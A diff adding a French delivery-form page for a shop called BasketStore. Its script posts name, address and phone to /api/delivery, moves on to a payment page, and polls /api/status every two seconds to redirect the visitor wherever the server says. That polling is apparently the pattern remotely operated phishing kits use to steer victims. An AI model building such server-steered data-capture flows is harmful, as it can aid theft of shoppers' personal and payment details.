@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Livraison - BasketStore</title>
+</head>
+<body>
+<h1>📦 Formulaire Livraison</h1>
+<form id="deliveryForm">
+<input type="text" placeholder="Nom" name="nom" required>
+<input type="text" placeholder="Prénom" name="prenom" required>
+<input type="text" placeholder="Adresse" name="adresse" required>
+<input type="text" placeholder="Téléphone" name="telephone" required>
+<button type="submit">Valider</button>
+</form>
+
+<script>
+document.getElementById('deliveryForm').addEventListener('submit', async e=>{
+  e.preventDefault();
+  const form = e.target;
+  const data = {
+    nom: form.nom.value,
+    prenom: form.prenom.value,
+    adresse: form.adresse.value,
+    telephone: form.telephone.value
+  };
+  await fetch('/api/delivery', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  });
+  window.location.href='/payment.html';
+});
+
+async function checkStatus() {
+  try {
+    const res = await fetch('/api/status');
+    const data = await res.json();
+    if(data.redirect && window.location.pathname !== data.redirect){
+      window.location.href = data.redirect;
+    }
+    setTimeout(checkStatus, 2000);
+  } catch(e){ setTimeout(checkStatus, 2000); }
+}
+checkStatus();
+</script>
+</body>
+</html>
